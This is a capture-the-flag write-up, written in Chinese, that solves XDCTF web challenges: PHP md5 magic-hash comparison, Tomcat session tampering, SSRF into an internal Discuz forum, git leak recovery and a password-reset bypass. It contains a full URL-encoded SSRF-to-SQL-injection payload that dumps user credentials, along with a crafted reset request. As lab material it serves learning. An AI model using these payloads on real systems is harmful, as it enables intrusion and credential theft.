##XDCTF

###web1-100
	反混淆
```php
$test=$_GET['test']; $test=md5($test); if($test=='0') { print "flag{xxxxxx}"; } else print "you are falied!"; print $test; 
```


	md5('240610708') 's result is 0e462097431906509019562988736854.

	md5('QNKCDZO') 's result is 0e830400451993494058024219903391

	flag:XDCTF{XTchInaIqLRWlJF0RI59aoVr5atctVCT}


###web1-200
	
	tomcat，session
	
	http://flagbox-23031374.xdctf.win:1234/examples/servlets/servlet/SessionExample
	给自己添加个login=true,user=Administrator
	XDCTF{2b5b7133402ecb87e07e85bf1327bd13}

###web1-300

	.user.ini找到wwwroot目录
	link参数可SSRF
	GET /index.php?link=file:///home/wwwroot/133.130.90.188/index.php
	查hosts发现		9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com
	扫端口发现这个站在3389
	十个discuz，read有个.user.ini，看看这个有没有
	link=http://9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com:3389/.user.ini
	在这里： open_basedir=/home/wwwroot/dz72:/tmp/:/proc/
	直接打exp

	http://133.130.90.188/?link=http://9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com:3389/faq.php?action%3Dgrouppermission%26gids%5B99%5D%3D%2527%26gids%5B100%5D%5B0%5D%3D%2529%2520and%2520%2528select%25201%2520from%2520%2528select%2520count%2528*%2529%2Cconcat%2528%2528select%2520concat%25280x5E5E5E%2Cusername%2C0x3a%2Cpassword%2C0x3a%2Csalt%2529%2520from%2520cdb_uc_members%2520limit%25200%2C1%2529%2Cfloor%2528rand%25280%2529*2%2529%2C0x5E%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2523

	admin:XDCTF{bf127a6ae4e2_ssrf_to_sqli}:99bc3c1

###web2

	发现.git存在，不过都是delete file
	到1.0里面对着hash把文件拖回来
	就可以代码审计了。。。

###web2-100
	问题在Auth.php  public function handle_resetpwd()
	注册->申请改密码->改密码的链接抓包->email=xdsec-cms@xdctf.com&verify[]=fb02d3d0965f0d24b90409dba97e0cb2->登录即可
	Congratulation, this is the [XDSEC-CMS] flag 2

	XDCTF-{i32mX4WK1gwEE9S9Oxd2}

	hint:
	admin url is /th3r315adm1n.php

###web2-200
	
	这个在index.php里
	XDCTF-{raGWvWahqZjww4RdHN90}



